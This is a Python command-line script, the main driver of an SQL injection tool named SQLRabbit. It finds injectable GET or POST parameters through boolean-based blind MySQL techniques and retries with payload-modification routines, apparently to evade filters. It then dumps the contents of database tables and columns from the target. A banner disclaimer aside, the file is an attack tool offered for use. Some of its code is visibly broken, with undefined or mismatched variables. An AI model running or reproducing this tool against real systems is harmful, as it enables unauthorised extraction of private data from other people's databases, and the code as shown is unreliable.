#!/usr/bin/python3

import time
import modify
import argparse

from colorama import Fore
from urlQuery import sendReq
from identify import identifyMySQLBoolean
from payloads.fuzzPayloads import fuzzGenericPayloads
from endPoints import getURL, getSpecialURL, getData, getSpecialData
from extract.BooleanTechnique.extractSQLAnding import extractSQLAndingMain
from extract.BooleanTechnique.extractLightSpeed import extractLightspeedMain
from payloads.extractPayloads import trueFalsePayloads, extractBP0, optimisedSQAndingPayload1, optimisedSQAndingPayload2, optimisedSQAndingPayload3, sQLAndingPayload

# Main
def displayBanner():
    # https://patorjk.com/software/taag/#p=testall&f=Doom&t=Iniksyon
    # https://naufalardhani.medium.com/how-to-create-ascii-text-banner-for-command-line-project-85e75dc02b07
    RED = "\33[91m"
    banner = f"""
    {RED}
 _____  _____ _     ______      _     _     _ _   
/  ___||  _  | |    | ___ \    | |   | |   (_) |  
\ `--. | | | | |    | |_/ /__ _| |__ | |__  _| |_ 
 `--. \| | | | |    |    // _` | '_ \| '_ \| | __|
/\__/ /\ \/' / |____| |\ \ (_| | |_) | |_) | | |_ 
\____/  \_/\_\_____/\_| \_\__,_|_.__/|_.__/|_|\__|
                                                   
    Created by Lucyn          
    """
    print (banner)
    print (Fore.WHITE + "[!] legal disclaimer: Usage of SQLRabbit for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program." + Fore.RESET)
    print ()

displayBanner()

def displayInfo(info):
    for tbl, rows in info.items():
        print (Fore.WHITE + f"\n\nTABLE: {tbl}" + Fore.RESET)
        print ('-' * (20 * len((list(rows[0].keys()))) + 30))
        columns = list(rows[0].keys())
        header = " | ".join(["{:<20s}" for _ in columns])
        print (header.format(*columns))
        print ('-' * (20 * len((list(rows[0].keys()))) + 30))

        for row in rows:
            rowV = [row[col] for col in columns]
            rowF = " | ".join(["{:<20s}" for _ in columns])
            print (rowF.format(*rowV))
        print ('-' * (20 * len((list(rows[0].keys()))) + 30))


# Boolean-Based (SQLANDing)
def booleanBasedSQLANDing(url, paramValues, vulnParam, sQLAndingPayload, trueFalsePayloads, d, tbl=None, clm=None):
    print (Fore.YELLOW + "[*] Running Boolean-based Technique" + Fore.RESET)
    r, info = extractSQLAndingMain(url, paramValues, vulnParam, sQLAndingPayload, trueFalsePayloads, d, tbl=tbl, clm=clm)
    if r:
        displayInfo(info)
        return True
    else:
        success = False
        for func in modify.modifyFunctions:
            mFunc = getattr(modify, func)
            print (Fore.YELLOW + f"[*] Starting modification: {func}" + Fore.RESET)
            r2, info = extractSQLAndingMain(url, paramValues, vulnParam, mFunc(sQLAndingPayload), mFunc(trueFalsePayloads), d, tbl=tbl, clm=clm)
            if r2:
                print (Fore.GREEN + f"[+] Vulnerability Found with modification: {func} in {vulnParam} parameter" + Fore.RESET)
                displayInfo(info)
                success = True
                return True
        if not success:
            print (Fore.RED + "[-] Boolean-based Technique Failed" + Fore.RESET)
            return False

# Non-Boolean-Based (Optimised SQLANDing)
def nonBooleanBasedOptimisedSQLANDing(url, paramvalues, vulnParam, payload1, payload2, payload3, d, tbl=None, clm=None):
    print (Fore.YELLOW + "[*] Running NonBoolean-based Technique" + Fore.RESET)
    t1 = paramValues.copy()
    t2 = paramValues.copy()
    t3 = paramValues.copy()
    t4 = paramValues.copy()
    t5 = paramValues.copy()
    t6 = paramValues.copy()
    t7 = paramValues.copy()
    t1[vulnParam] = 1
    t2[vulnParam] = 2
    t3[vulnParam] = 3
    t4[vulnParam] = 4
    t5[vulnParam] = 5
    t6[vulnParam] = 6
    t7[vulnParam] = 7
    rT1 = sendReq(url, data=t1, allow_redirects=False) if d else sendReq(url, params=t1, allow_redirects=False)
    rT2 = sendReq(url, data=t2, allow_redirects=False) if d else sendReq(url, params=t2, allow_redirects=False)
    rT3 = sendReq(url, data=t3, allow_redirects=False) if d else sendReq(url, params=t3, allow_redirects=False)
    rT4 = sendReq(url, data=t4, allow_redirects=False) if d else sendReq(url, params=t4, allow_redirects=False)
    rT5 = sendReq(url, data=t5, allow_redirects=False) if d else sendReq(url, params=t5, allow_redirects=False)
    rT6 = sendReq(url, data=t6, allow_redirects=False) if d else sendReq(url, params=t6, allow_redirects=False)
    rT7 = sendReq(url, data=t7, allow_redirects=False) if d else sendReq(url, params=t7, allow_redirects=False)
    r, info = extractLightspeedMain(url, paramValues, vulnParam, payload1, payload2, payload3, rT1, rT2, rT3, rT4, rT5, rT6, rT7, d, tbl=tbl, clm=clm)
    if r:
        displayInfo(info)
        return True
    else:
        success = False
        for func in modify.modifyFunctions:
            mFunc = getattr(modify, func)
            print (Fore.YELLOW + f"[*] Starting modification: {func}" + Fore.RESET)
            r2, info = extractLightspeedMain(url, paramValues, vulnParam, mFunc(payload1), mFunc(payload2), mFunc(payload3), rT1, rT2, rT3, rT4, rT5, rT6, rT7, d, tbl=tbl, clm=clm)
            if r2:
                print (Fore.GREEN + f"[+] Vulnerability Found with modification: {func} in {specialParam} parameter" + Fore.RESET)
                displayInfo(info)
                success = True
                return True
        if not success:
            print (Fore.RED + "[-] NonBoolean-based Technique Failed" + Fore.RESET)
            return False

def findVuln(url, paramValues, payload, trueFalsePayloads, d):
    results, params, vulnPoint = identifyMySQLBoolean(url, paramValues, payload, trueFalsePayloads, d)
    if results:
        print (Fore.GREEN + f"[+] Potential Vulnerability Found in {vulnPoint} parameter" + Fore.RESET)
        return True, params, vulnPoint
    else:
        success = False
        for func in modify.modifyFunctions:
            mFunc = getattr(modify, func)
            print (Fore.YELLOW + f"[*] Starting modification: {func}" + Fore.RESET)
            results, params, vulnPoint = identifyMySQLBoolean(url, paramValues, mFunc(payload), trueFalsePayloads, d)
            if results:
                print (Fore.GREEN + f"[+] Vulnerability Found with modification: {func} in {vulnPoint} parameter" + Fore.RESET)
                return True, params, vulnPoint
        if not success:
            print (Fore.RED + "[-] Cound not find vulnerable point" + Fore.RESET)
            return False

# Get the arguments
parser = argparse.ArgumentParser(description='SQLRabbit menu')
parser.add_argument('--url', help='The base URL')
parser.add_argument('--data', help='Invoke Post Request')
parser.add_argument('--speed', help='The speedy extraction set True to use. (Needs to be specified with *)')
parser.add_argument('--table', help='Specify Table name')
parser.add_argument('--column', help='Specify Column name(s) separeted by commas')
args = parser.parse_args()

if not args.url:
    print (Fore.RED + "Error: You must provide a valid URL" + Fore.RESET)  
else:
    url = args.url
    tbl = args.table
    clm = args.column.split(',') if args.column else None

    # GET Req
    if not args.data:
        d = False
        if '*' in url:
            url, paramValues, vulnParam = getSpecialURL(url)
            if args.speed:
                nonBooleanBasedOptimisedSQLANDing(url, paramValues, vulnParam, optimisedSQAndingPayload1, optimisedSQAndingPayload2, optimisedSQAndingPayload3, d, tbl=tbl, clm=clm)
            else:
                booleanBasedSQLANDing(url, paramValues, vulnParam, sQLAndingPayload, trueFalsePayloads, d, tbl=tbl, clm=clm)
        else:
            url, paramValues = getURL(url)
            tf, params, vulnPoint = findVuln(url, paramValues, fuzzGenericPayloads, trueFalsePayloads, d)
            if tf:
                if args.speed:
                    nonBooleanBasedOptimisedSQLANDing(url, params, vulnPoint, optimisedSQAndingPayload1, optimisedSQAndingPayload2, optimisedSQAndingPayload3, d, tbl=tbl, clm=clm)
                else:
                    booleanBasedSQLANDing(url, params, vulnPoint, sQLAndingPayload, trueFalsePayloads, d, tbl=tbl, clm=clm)

    # POST Req
    else:
        data = args.data
        d = True
        if '*' in data:
            url, paramValues, vulnParam = getSpecialData(url, data)
            if args.speed:
                nonBooleanBasedOptimisedSQLANDing(url, paramValues, vulnParam, optimisedSQAndingPayload1, optimisedSQAndingPayload2, optimisedSQAndingPayload3, d, tbl=tbl, clm=clm)
            else:
                booleanBasedSQLANDing(url, paramValues, vulnParam, sQLAndingPayload, trueFalsePayloads, d, tbl=tbl, clm=clm)
        else:
            url, paramValues = getData(url, data)
            tf, params, vulnPoint = findVuln(url, paramValues, fuzzGenericPayloads, trueFalsePayloads, d)
            if tf:
                if args.speed:
                    nonBooleanBasedOptimisedSQLANDing(url, params, vulnPoint, optimisedSQAndingPayload1, optimisedSQAndingPayload2, optimisedSQAndingPayload3, d, tbl=tbl, clm=clm)
                else:
                    booleanBasedSQLANDing(url, params, vulnPoint, sQLAndingPayload, trueFalsePayloads, d, tbl=tbl, clm=clm)